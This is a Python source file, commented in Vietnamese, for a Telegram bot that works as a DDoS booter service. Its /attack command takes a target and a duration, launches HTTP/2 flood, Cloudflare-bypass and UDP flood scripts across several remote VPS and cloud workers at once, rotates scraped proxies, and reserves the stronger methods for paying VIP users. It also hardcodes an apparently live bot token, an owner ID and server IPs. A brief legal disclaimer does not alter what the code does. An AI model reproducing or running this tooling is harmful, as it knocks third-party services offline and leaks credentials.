#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
H2 Free Bot — Chủ sở hữu H2 
---------------------------------------
- Bot API chính để phân phối công việc cho các VPS
- Lệnh: /start /help /attack /methods /status /on /off /broadcast /addvip /removevip /addproxy /scanproxy
- Quản lý nhiều VPS với tính năng tự động chuyển đổi khi bận
- Ghi log, thời gian hoạt động và số liệu server cơ bản qua psutil
- Quản lý người dùng VIP cho phương thức BypassCF, UAM, UDPBypass trong lệnh /attack
- Sử dụng file proxy.txt trực tiếp trên tất cả VPS

CÀI ĐẶT
-----
1) Cài đặt: pip install pyTelegramBotAPI psutil requests
2) Thiết lập TOKEN, OWNER_ID và VPS_SERVERS trong mã nguồn
3) Đảm bảo mỗi VPS có script worker (vps_worker.py), cfhieu.js, FloodH2.js, UAM.js và udpbypass (biên dịch từ udpbypass.c)
4) Đảm bảo file proxy.txt có sẵn trên mỗi VPS
5) Chạy: python3 h2_free_bot.py

PHÁP LÝ
-----
Mẫu này chỉ dùng cho tự động hóa hợp pháp. Mọi hình thức kiểm tra tải hoặc tấn công DDoS trái phép đều bị cấm. Chỉ thực hiện kiểm tra tải với sự cho phép bằng văn bản rõ ràng từ chủ sở hữu hệ thống trong môi trường được kiểm soát.
"""

import os
import time
import logging
import psutil
import telebot
import requests
import json
from threading import Thread
import concurrent.futures
import socket

# ===================== Cấu hình =====================
TOKEN = os.getenv("BOT_TOKEN", "8478870651:AAF07df3jjh6n3xevJHCmqOp5yWG_WB9wmA")  # Token bot Telegram
OWNER_ID = int(os.getenv("BOT_OWNER_ID", "8118372021"))  # ID người dùng Telegram của chủ sở hữu
DEFAULT_PROXY_FILE = "proxy.txt"  # File proxy trên VPS
DEFAULT_RATE = "64"  # Tỷ lệ yêu cầu mặc định cho Flood
DEFAULT_THREAD = "5"  # Số luồng mặc định cho Flood
VIP_FILE = "vip_users.json"  # File lưu danh sách ID người dùng VIP
PROXY_SOURCES_FILE = "api.txt"  # File chứa nguồn proxy

# Danh sách endpoint của các VPS với ID thay thế IP
# Bạn có thể thêm các môi trường như Codespace hoặc IDX (Project IDX) bằng cách thêm endpoint URL tương ứng
# Ví dụ: Nếu Codespace hoặc IDX có server worker chạy trên port 5000 và có địa chỉ công khai (ví dụ qua ngrok hoặc public URL),
# thêm như sau: {"id": "Codespace-001", "url": "http://your-codespace-public-url:5000/execute"}
# Đảm bảo worker (vps_worker.py) chạy trên các môi trường đó và có thể nhận request từ bên ngoài.
VPS_SERVERS = [
    {"id": "VPS-001", "url": "http://160.191.243.252:5000/execute"},
    {"id": "VPS-002", "url": "http://103.238.235.193:5000/execute"},
    {"id": "Codespace-001", "url": "https://probable-broccoli-rqvjpqrjxv92xvpr-5000.app.github.dev/execute"},
    {"id": "IDX-001", "url": "https://h2-16504995-5000.web.app/execute"}  # Cập nhật IP thực tế của VPS-002
    # Thêm ví dụ cho Codespace hoặc IDX (thay bằng URL thực tế của bạn):
    # {"id": "Codespace-001", "url": "http://your-codespace-url:5000/execute"},
    # {"id": "IDX-001", "url": "http://your-idx-url:5000/execute"},
]

# Danh sách phương thức hiện có
METHODS = [
    {"name": "BypassCF", "script": "cfhieu.js", "description": "Phương thức bypass Cloudflare (chỉ dành cho VIP)", "max_time": 120, "vip_only": True},
    {"name": "Flood", "script": "FloodH2.js", "description": "Phương thức flood HTTP với HTTP/2", "max_time": 60, "vip_max_time": 120},
    {"name": "UAM", "script": "UAM.js", "description": "Phương thức UAM (chỉ dành cho VIP)", "max_time": 120, "vip_only": True},
    {"name": "UDPBypass", "script": "udpbypass", "description": "Phương thức UDP Bypass (chỉ dành cho VIP)", "max_time": 120, "vip_only": True}
]

BOT_NAME = "H2 Free Bot"
PARSE_MODE = "HTML"

# ===================== Ghi log =====================
os.makedirs("logs", exist_ok=True)
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("logs/h2_free_bot.log", encoding="utf-8"),
        logging.StreamHandler()
    ]
)

# ===================== Quản lý VIP =====================
def load_vip_users():
    """Tải danh sách ID người dùng VIP từ file."""
    try:
        if os.path.exists(VIP_FILE):
            with open(VIP_FILE, 'r') as f:
                return set(json.load(f))
        return set()
    except Exception as e:
        logging.error("Lỗi khi tải danh sách VIP: %s", e)
        return set()

def save_vip_users(vip_users):
    """Lưu danh sách ID người dùng VIP vào file."""
    try:
        with open(VIP_FILE, 'w') as f:
            json.dump(list(vip_users), f)
    except Exception as e:
        logging.error("Lỗi khi lưu danh sách VIP: %s", e)

# Khởi tạo danh sách VIP
vip_users = load_vip_users()

# ===================== Quản lý Proxy =====================
def load_proxy_sources():
    """Tải danh sách nguồn proxy từ file api.txt."""
    try:
        if os.path.exists(PROXY_SOURCES_FILE):
            with open(PROXY_SOURCES_FILE, 'r') as f:
                return [line.strip() for line in f.readlines() if line.strip()]
        return []
    except Exception as e:
        logging.error("Lỗi khi tải nguồn proxy: %s", e)
        return []

def ensure_proxy_file_exists():
    """Đảm bảo file proxy.txt tồn tại trên VPS."""
    for vps in VPS_SERVERS:
        try:
            update_url = vps["url"].replace("/execute", "/check_proxies")
            response = requests.get(update_url, timeout=10)
            if response.status_code == 200:
                logging.info(f"File proxy.txt được xác nhận trên VPS {vps['id']}.")
            else:
                logging.error(f"Kiểm tra file proxy.txt thất bại trên VPS {vps['id']}: {response.text}")
        except Exception as e:
            logging.error(f"Lỗi khi kiểm tra proxy.txt trên VPS {vps['id']}: {str(e)}")

def fetch_proxies_from_sources(sources):
    """Lấy proxy từ các nguồn."""
    proxies = set()
    for source in sources:
        try:
            resp = requests.get(source, timeout=10)
            if resp.status_code == 200:
                new_proxies = [p.strip() for p in resp.text.splitlines() if p.strip()]
                proxies.update(new_proxies)
        except Exception as e:
            logging.error(f"Lỗi khi lấy proxy từ {source}: {str(e)}")
    return list(proxies)

def check_proxy(proxy):
    """Kiểm tra proxy sống bằng cách kết nối đến google.com."""
    try:
        host, port = proxy.split(':')
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, int(port)))
        sock.close()
        return True
    except:
        return False

# ===================== Biến toàn cục =====================
bot = telebot.TeleBot(TOKEN, parse_mode=PARSE_MODE)
start_time = time.time()
bot_active = True  # Có thể bật/tắt bởi chủ sở hữu qua /on /off
running_tasks = {}  # Theo dõi các tác vụ đang chạy theo chat ID (bây giờ là dict chat_id -> list of tasks)
scanning_proxies = False  # Trạng thái scan proxy

# ===================== Quản lý VPS =====================
def check_vps_status(vps_entry):
    """Kiểm tra trạng thái VPS (rảnh hay bận) dựa trên URL."""
    try:
        status_url = vps_entry["url"].replace("/execute", "/status")
        logging.info(f"Đang kiểm tra trạng thái VPS {vps_entry['id']} tại {status_url}...")
        response = requests.get(status_url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            is_available = data.get("status") != "running"
            logging.info(f"Trạng thái VPS {vps_entry['id']}: {'Rảnh' if is_available else 'Bận'}")
            return is_available
        else:
            logging.error(f"Kiểm tra trạng thái VPS {vps_entry['id']} thất bại với mã {response.status_code}: {response.text}")
            return False
    except requests.exceptions.Timeout:
        logging.error(f"Timeout khi kiểm tra trạng thái VPS {vps_entry['id']}: Có thể VPS không phản hồi.")
        return False
    except requests.exceptions.ConnectionError:
        logging.error(f"Lỗi kết nối với VPS {vps_entry['id']}: Kiểm tra mạng hoặc port 5000.")
        return False
    except Exception as e:
        logging.error(f"Kiểm tra trạng thái VPS {vps_entry['id']} thất bại: {str(e)}")
        return False

def get_all_available_vps():
    """Tìm tất cả các VPS rảnh, ưu tiên theo thứ tự danh sách."""
    available = []
    for vps_entry in VPS_SERVERS:
        if check_vps_status(vps_entry):
            logging.info(f"VPS rảnh: {vps_entry['id']}")
            available.append(vps_entry)
    if not available:
        logging.warning("Không có VPS nào rảnh.")
    return available

def execute_on_vps(vps_entry, payload, chat_id):
    """Gửi lệnh đến VPS và theo dõi quá trình thực thi."""
    try:
        response = requests.post(vps_entry["url"], json=payload, timeout=10)
        if response.status_code == 200:
            data = response.json()
            task_id = data.get("task_id")
            bot.send_message(chat_id, f"<b>Đã khởi động tấn công trên VPS</b> 🔥🚀\nID tác vụ: {task_id}\nVPS: {vps_entry['id']}\n• Mục tiêu: {payload['target']}\n• Thời gian: {payload['time']} giây\nTrạng thái: <code>Đang thực thi... 💥</code>\nCơn lũ đang cuộn trào! 🌊⚡ Theo dõi bằng /status.")
            
            # Theo dõi trạng thái tác vụ
            def monitor_task():
                error_count = 0
                while True:
                    try:
                        status_response = requests.get(f"{vps_entry['url'].replace('/execute', '/status')}?task_id={task_id}", timeout=15)
                        if status_response.status_code == 200:
                            status_data = status_response.json()
                            if status_data.get("status") == "completed":
                                bot.send_message(chat_id, f"<b>Hoàn tất thực thi tấn công</b> ✅\nID tác vụ: {task_id}\nTấn công đã kết thúc.")
                                # Xóa task khỏi list running_tasks
                                if chat_id in running_tasks:
                                    running_tasks[chat_id] = [t for t in running_tasks[chat_id] if t['task_id'] != task_id]
                                    if not running_tasks[chat_id]:
                                        del running_tasks[chat_id]
                                break
                            elif status_data.get("status") == "not_found":
                                bot.send_message(chat_id, f"<b>Lỗi</b> ❌\nTask {task_id} không tồn tại trên VPS.")
                                break
                            elif status_data.get("output"):
                                bot.send_message(chat_id, f"<code>{status_data['output']}</code>")
                            error_count = 0
                        else:
                            logging.error(f"Truy vấn trạng thái thất bại, mã trạng thái: {status_response.status_code}")
                            error_count += 1
                            if error_count > 5:
                                bot.send_message(chat_id, f"<b>Lỗi theo dõi</b> ⚠️\nKhông thể lấy trạng thái task {task_id} sau nhiều lần thử. Kiểm tra VPS.")
                                break
                    except requests.exceptions.ReadTimeout:
                        bot.send_message(chat_id, f"<b>Cảnh báo</b> ⚠️\nID tác vụ: {task_id}\nKết nối với VPS {vps_entry['id']} bị timeout. Vui lòng kiểm tra mạng hoặc thử lại sau.")
                        break
                    except Exception as e:
                        bot.send_message(chat_id, f"<b>Lỗi khi theo dõi tác vụ</b> ❌\nID tác vụ: {task_id}\nLỗi: {str(e)}")
                        break
                    time.sleep(2)
            
            Thread(target=monitor_task).start()
        else:
            bot.send_message(chat_id, f"<b>Khởi động thất bại</b> ❌\nVPS {vps_entry['id']} trả về lỗi: {response.text}")
    except Exception as e:
        bot.send_message(chat_id, f"<b>Khởi động thất bại</b> ❌\nLỗi khi liên hệ VPS {vps_entry['id']}: {str(e)}")

# ===================== Hàm hỗ trợ =====================
def is_owner(uid: int) -> bool:
    """Kiểm tra xem người dùng có phải là chủ sở hữu không."""
    return OWNER_ID != 0 and uid == OWNER_ID

def is_vip(uid: int) -> bool:
    """Kiểm tra xem người dùng có phải là VIP hoặc chủ sở hữu không."""
    return uid in vip_users or is_owner(uid)

def uptime_str() -> str:
    """Tính thời gian bot hoạt động."""
    s = int(time.time() - start_time)
    d, s = divmod(s, 86400)
    h, s = divmod(s, 3600)
    m, s = divmod(s, 60)
    return f"{d} ngày {h} giờ {m} phút {s} giây"

def safe_reply(message, text: str):
    """Gửi tin nhắn trả lời một cách an toàn."""
    try:
        bot.reply_to(message, text)
    except Exception as e:
        logging.error("Lỗi gửi tin nhắn: %s", e)

def require_active(func):
    """Decorator: bỏ qua tin nhắn từ người không phải chủ sở hữu khi bot tắt."""
    def wrapper(message):
        global bot_active
        if not bot_active and not is_owner(message.from_user.id):
            return
        try:
            bot.send_chat_action(message.chat.id, "typing")
        except Exception:
            pass
        return func(message)
    return wrapper

# ===================== Lệnh =====================
@bot.message_handler(commands=["start", "help"])
@require_active
def cmd_help(message):
    """Hiển thị thông tin trợ giúp."""
    text = (
        f"<b>{BOT_NAME}</b>\n"
        "Bot Telegram - Công Cụ Miễn Phí.\n\n"
        "<b>Lệnh</b>\n"
        "• /start, /help — hiển thị trợ giúp này\n"
        "• /attack [phương_thức] &lt;mục_tiêu&gt; &lt;thời_gian&gt; — chạy phương thức tấn công (BypassCF chỉ dành cho VIP)\n"
        "   - Đối với UAM: /attack UAM target time [rate=100] [thread=8]\n"
        "   - Đối với UDPBypass: /attack UDPBypass ip port time [burst=1024]\n"
        "• /methods — xem danh sách các phương thức hiện có\n"
        "• /status — trạng thái bot/server\n"
    )
    if is_owner(message.from_user.id):
        text += (
            "\n<b>Chỉ dành cho chủ sở hữu</b>\n"
            "• /on, /off — bật/tắt bot (người không phải chủ sở hữu sẽ bị tắt tiếng)\n"
            "• /broadcast &lt;tin_nhắn&gt; — gửi tin nhắn đến chat hiện tại (demo)\n"
            "• /addvip &lt;@tên_người_dùng&gt; &lt;user_id&gt; — thêm người dùng vào danh sách VIP\n"
            "• /removevip &lt;user_id&gt; — xóa người dùng khỏi danh sách VIP\n"
            "• /addproxy — cập nhật proxy mới từ nguồn (xóa cũ và thêm mới)\n"
            "• /scanproxy — scan proxy sống từ nguồn và cập nhật (tạm dừng tấn công trong lúc scan)\n"
        )
    safe_reply(message, text)

@bot.message_handler(commands=["methods"])
@require_active
def cmd_methods(message):
    """Hiển thị danh sách các phương thức hiện có."""
    methods_text = "<b>Danh sách Phương thức</b> 🌟\n"
    for method in METHODS:
        vip_note = " (chỉ VIP)" if method.get("vip_only", False) else ""
        max_time = method["max_time"]
        if "vip_max_time" in method and is_vip(message.from_user.id):
            max_time = method["vip_max_time"]
        methods_text += f"• <b>{method['name']}</b>{vip_note}: {method['description']} (Thời gian tối đa: {max_time} giây)\n"
    safe_reply(message, methods_text)

@bot.message_handler(commands=["attack"])
@require_active
def cmd_attack(message):
    """Thực thi lệnh tấn công."""
    global scanning_proxies
    if scanning_proxies:
        safe_reply(message, "<b>Thông báo</b> ⚠️\nBot đang scan proxy trong vòng 10p. Vui lòng chờ!")
        return

    parts = message.text.split()
    if len(parts) < 3:
        safe_reply(message, "Cách dùng: <code>/attack [phương_thức] mục_tiêu thời_gian ...</code>\nXem /help để biết chi tiết.")
        return
    
    method_name = parts[1].upper()
    selected_method = next((m for m in METHODS if m["name"].upper() == method_name), None)
    if not selected_method:
        safe_reply(message, "<b>Lỗi</b> ❌\nPhương thức không tồn tại. Sử dụng /methods để xem danh sách.")
        return

    # Kiểm tra quyền VIP
    if selected_method.get("vip_only", False) and not is_vip(message.from_user.id):
        safe_reply(message, "<b>Truy cập bị từ chối</b> 🚫\nPhương thức này chỉ dành cho người dùng VIP. Liên hệ chủ sở hữu để trở thành VIP.")
        return

    # Parse tùy theo method
    if method_name in ["BYPASSCF", "FLOOD"]:
        if len(parts) < 4:
            safe_reply(message, f"Cách dùng cho {method_name}: <code>/attack {method_name} target time</code>")
            return
        target = parts[2]
        time_ = parts[3]
        rate = DEFAULT_RATE
        thread = DEFAULT_THREAD
    elif method_name == "UAM":
        if len(parts) < 4:
            safe_reply(message, "Cách dùng cho UAM: <code>/attack UAM target time [rate=100] [thread=8]</code>")
            return
        target = parts[2]
        time_ = parts[3]
        rate = parts[4] if len(parts) > 4 else "100"
        thread = parts[5] if len(parts) > 5 else "8"
    elif method_name == "UDPBYPASS":
        if len(parts) < 5:
            safe_reply(message, "Cách dùng cho UDPBypass: <code>/attack UDPBypass ip port time [burst=1024]</code>")
            return
        ip = parts[2]
        port_ = parts[3]
        time_ = parts[4]
        burst = parts[5] if len(parts) > 5 else "1024"
        target = ip
    else:
        safe_reply(message, "<b>Lỗi</b> ❌\nPhương thức không được hỗ trợ.")
        return

    # Kiểm tra và giới hạn thời gian tấn công
    try:
        time_int = int(time_)
        max_time = selected_method["max_time"]
        if "vip_max_time" in selected_method and is_vip(message.from_user.id):
            max_time = selected_method["vip_max_time"]
        if time_int <= 0 or time_int > max_time:
            safe_reply(message, f"<b>Lỗi</b> ❌\nThời gian phải từ 1 đến {max_time} giây cho phương thức {selected_method['name']}.")
            return
    except ValueError:
        safe_reply(message, "<b>Lỗi</b> ❌\nThời gian phải là một số nguyên hợp lệ.")
        return

    script = selected_method["script"]
    proxyfile = DEFAULT_PROXY_FILE

    # Xây dựng payload tùy method
    payload = {
        "script": script,
        "target": target,
        "time": time_,
    }
    if method_name in ["FLOOD", "UAM"]:
        payload["rate"] = rate
        payload["thread"] = thread
        payload["proxyfile"] = proxyfile
    if method_name == "UAM":
        payload["cookiecount"] = "6"
    if method_name == "UDPBYPASS":
        payload["port"] = port_
        payload["packet_size"] = "1472"
        payload["burst"] = burst
    if method_name == "BYPASSCF":
        payload["rate"] = DEFAULT_RATE
        payload["thread"] = DEFAULT_THREAD
        payload["proxyfile"] = proxyfile
    
    # Tìm tất cả VPS rảnh
    available_vps = get_all_available_vps()
    if not available_vps:
        safe_reply(message, "<b>Lỗi</b> ❌\nKhông có VPS nào rảnh để thực thi tác vụ. Vui lòng chờ khi VPS rảnh và kiểm tra /status.")
        return
    
    # Lưu thông tin tác vụ (bây giờ là list)
    if message.chat.id not in running_tasks:
        running_tasks[message.chat.id] = []
    for vps_entry in available_vps:
        running_tasks[message.chat.id].append({"vps_id": vps_entry["id"], "target": target, "time": time_, "task_id": None})  # task_id sẽ cập nhật sau
    
    # Thực thi trên tất cả VPS rảnh cùng lúc
    for vps_entry in available_vps:
        Thread(target=execute_on_vps, args=(vps_entry, payload, message.chat.id)).start()

@bot.message_handler(commands=["addvip"])
def cmd_addvip(message):
    """Thêm người dùng vào danh sách VIP."""
    if not is_owner(message.from_user.id):
        safe_reply(message, "<b>Truy cập bị từ chối</b> 🚫\nLệnh này chỉ dành cho chủ sở hữu.")
        return
    parts = message.text.split()
    if len(parts) != 3:
        safe_reply(message, "Cách dùng: <code>/addvip @tên_người_dùng user_id</code>")
        return
    
    username, user_id = parts[1], parts[2]
    if not username.startswith('@'):
        safe_reply(message, "<b>Lỗi</b> ❌\nTên người dùng phải bắt đầu bằng @.")
        return
    
    try:
        user_id = int(user_id)
        vip_users.add(user_id)
        save_vip_users(vip_users)
        safe_reply(message, f"<b>Thành công</b> ✅\nNgười dùng {username} (ID: {user_id}) đã được thêm vào danh sách VIP.")
    except ValueError:
        safe_reply(message, "<b>Lỗi</b> ❌\nID người dùng phải là số.")
    except Exception as e:
        safe_reply(message, f"<b>Lỗi</b> ❌\nThêm VIP thất bại: {str(e)}")

@bot.message_handler(commands=["removevip"])
def cmd_removevip(message):
    """Xóa người dùng khỏi danh sách VIP."""
    if not is_owner(message.from_user.id):
        safe_reply(message, "<b>Truy cập bị từ chối</b> 🚫\nLệnh này chỉ dành cho chủ sở hữu.")
        return
    parts = message.text.split()
    if len(parts) != 2:
        safe_reply(message, "Cách dùng: <code>/removevip user_id</code>")
        return
    
    try:
        user_id = int(parts[1])
        if user_id in vip_users:
            vip_users.remove(user_id)
            save_vip_users(vip_users)
            safe_reply(message, f"<b>Thành công</b> ✅\nNgười dùng {user_id} đã bị xóa khỏi danh sách VIP.")
        else:
            safe_reply(message, f"<b>Lỗi</b> ❌\nNgười dùng {user_id} không có trong danh sách VIP.")
    except ValueError:
        safe_reply(message, "<b>Lỗi</b> ❌\nID người dùng phải là số.")
    except Exception as e:
        safe_reply(message, f"<b>Lỗi</b> ❌\nXóa VIP thất bại: {str(e)}")

@bot.message_handler(commands=["status"])
@require_active
def cmd_status(message):
    """Hiển thị trạng thái bot và VPS."""
    try:
        cpu = psutil.cpu_percent(interval=0.6)
        mem = psutil.virtual_memory().percent
        disk = psutil.disk_usage("/").percent
    except Exception:
        cpu = mem = disk = -1
    
    process_status = "Không có tác vụ tấn công nào đang chạy."
    if message.chat.id in running_tasks and running_tasks[message.chat.id]:
        tasks = running_tasks[message.chat.id]
        process_status = "\n".join([f"Tấn công đang chạy trên VPS {t['vps_id']}... 💥\nMục tiêu: {t['target']}\nThời gian: {t['time']} giây" for t in tasks])
    
    vps_status = "\n".join([f"• VPS {vps['id']}: {'Rảnh ✅' if check_vps_status(vps) else 'BẬN 🛑'}" for vps in VPS_SERVERS])
    
    text = (
        "<b>Trạng thái Bot</b> 🌟\n"
        f"• Thời gian hoạt động: {uptime_str()}\n"
        f"• CPU: {cpu}% 🔥\n"
        f"• RAM: {mem}% ⚡\n"
        f"• Ổ cứng: {disk}% 💾\n"
        f"• Trạng thái: {'BẬT ✅' if bot_active else 'TẮT 🛑'}\n"
        f"• Tấn công: {process_status}\n"
        f"• Trạng thái VIP: {'VIP ✅' if is_vip(message.from_user.id) else 'Không phải VIP 🚫'}\n"
        f"• Scan Proxy: {'Đang scan ⚙️' if scanning_proxies else 'Không scan'}\n"
        f"<b>Trạng thái VPS</b>\n{vps_status}"
    )
    safe_reply(message, text)

@bot.message_handler(commands=["on"])
def cmd_on(message):
    """Bật bot."""
    global bot_active
    if not is_owner(message.from_user.id):
        return
    bot_active = True
    safe_reply(message, "<b>Bot BẬT</b> ✅")

@bot.message_handler(commands=["off"])
def cmd_off(message):
    """Tắt bot."""
    global bot_active
    if not is_owner(message.from_user.id):
        return
    bot_active = False
    safe_reply(message, "<b>Bot TẮT</b> 🛑")

@bot.message_handler(commands=["broadcast"])
def cmd_broadcast(message):
    """Gửi tin nhắn phát sóng."""
    if not is_owner(message.from_user.id):
        return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        safe_reply(message, "Cách dùng: <code>/broadcast tin_nhắn</code>")
        return
    bot.send_message(message.chat.id, f"<b>[Phát tin]</b> {parts[1]}", parse_mode=PARSE_MODE)

@bot.message_handler(commands=["addproxy"])
def cmd_addproxy(message):
    """Cập nhật proxy mới từ nguồn, xóa cũ và thêm mới."""
    if not is_owner(message.from_user.id):
        safe_reply(message, "<b>Truy cập bị từ chối</b> 🚫\nLệnh này chỉ dành cho chủ sở hữu.")
        return
    
    sources = load_proxy_sources()
    if not sources:
        safe_reply(message, "<b>Lỗi</b> ❌\nKhông tìm thấy nguồn proxy trong api.txt.")
        return
    
    proxies = fetch_proxies_from_sources(sources)
    
    if not proxies:
        safe_reply(message, "<b>Lỗi</b> ❌\nKhông thể lấy proxy từ bất kỳ nguồn nào.")
        return
    
    success_count = 0
    for vps in VPS_SERVERS:
        update_url = vps["url"].replace("/execute", "/update_proxies")
        try:
            response = requests.post(update_url, json={"proxies": proxies}, timeout=10)
            if response.status_code == 200:
                success_count += 1
                logging.info(f"Đã cập nhật {len(proxies)} proxy trên VPS {vps['id']}.")
            else:
                logging.error(f"Lỗi cập nhật proxy trên VPS {vps['id']}: {response.text}")
        except Exception as e:
            logging.error(f"Lỗi khi cập nhật proxy trên VPS {vps['id']}: {str(e)}")
    
    safe_reply(message, f"<b>Thành công</b> ✅\nĐã cập nhật {len(proxies)} proxy mới trên {success_count}/{len(VPS_SERVERS)} VPS (xóa proxy cũ).")

@bot.message_handler(commands=["scanproxy"])
def cmd_scanproxy(message):
    """Scan proxy sống từ nguồn và cập nhật, tạm dừng tấn công."""
    if not is_owner(message.from_user.id):
        safe_reply(message, "<b>Truy cập bị từ chối</b> 🚫\nLệnh này chỉ dành cho chủ sở hữu.")
        return
    
    global scanning_proxies
    if scanning_proxies:
        safe_reply(message, "<b>Thông báo</b> ⚠️\nĐang scan proxy rồi!")
        return
    
    scanning_proxies = True
    safe_reply(message, "<b>Bắt đầu scan</b> ⚙️\nBot sẽ tạm dừng nhận lệnh tấn công trong vòng 10p. Đang lấy và kiểm tra proxy...")

    def scan_and_update():
        sources = load_proxy_sources()
        if not sources:
            safe_reply(message, "<b>Lỗi</b> ❌\nKhông tìm thấy nguồn proxy trong api.txt.")
            scanning_proxies = False
            return
        
        proxies = fetch_proxies_from_sources(sources)
        if not proxies:
            safe_reply(message, "<b>Lỗi</b> ❌\nKhông thể lấy proxy từ bất kỳ nguồn nào.")
            scanning_proxies = False
            return
        
        # Scan proxy sống với multithreading để nhanh
        alive_proxies = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=500) as executor:  # Số luồng cao để scan nhanh
            future_to_proxy = {executor.submit(check_proxy, proxy): proxy for proxy in proxies}
            for future in concurrent.futures.as_completed(future_to_proxy):
                if future.result():
                    alive_proxies.append(future_to_proxy[future])
        
        if not alive_proxies:
            safe_reply(message, "<b>Lỗi</b> ❌\nKhông có proxy sống nào.")
            scanning_proxies = False
            return
        
        success_count = 0
        for vps in VPS_SERVERS:
            update_url = vps["url"].replace("/execute", "/update_proxies")
            try:
                response = requests.post(update_url, json={"proxies": alive_proxies}, timeout=10)
                if response.status_code == 200:
                    success_count += 1
                    logging.info(f"Đã cập nhật {len(alive_proxies)} proxy sống trên VPS {vps['id']}.")
                else:
                    logging.error(f"Lỗi cập nhật proxy trên VPS {vps['id']}: {response.text}")
            except Exception as e:
                logging.error(f"Lỗi khi cập nhật proxy trên VPS {vps['id']}: {str(e)}")
        
        safe_reply(message, f"<b>Scan hoàn tất</b> ✅\nSố lượng proxy sống: {len(alive_proxies)}\nĐã cập nhật trên {success_count}/{len(VPS_SERVERS)} VPS (xóa proxy cũ). Bot có thể nhận lệnh tấn công lại.")
        scanning_proxies = False

    Thread(target=scan_and_update).start()

# ===================== Vòng lặp chính =====================
def main():
    """Hàm chính để khởi động bot."""
    if not TOKEN or OWNER_ID == 0:
        logging.error("Vui lòng thiết lập BOT_TOKEN và BOT_OWNER_ID (trong biến môi trường hoặc mã nguồn).")
    if not VPS_SERVERS:
        logging.error("Vui lòng cấu hình VPS_SERVERS với ít nhất một endpoint VPS.")
    logging.info("%s đang khởi động…", BOT_NAME)
    
    # Kiểm tra file proxy.txt trên VPS
    ensure_proxy_file_exists()
    
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=40)
        except Exception as e:
            logging.error("Lỗi polling: %s — khởi động lại sau 5 giây", e)
            time.sleep(5)

if __name__ == "__main__":
    main()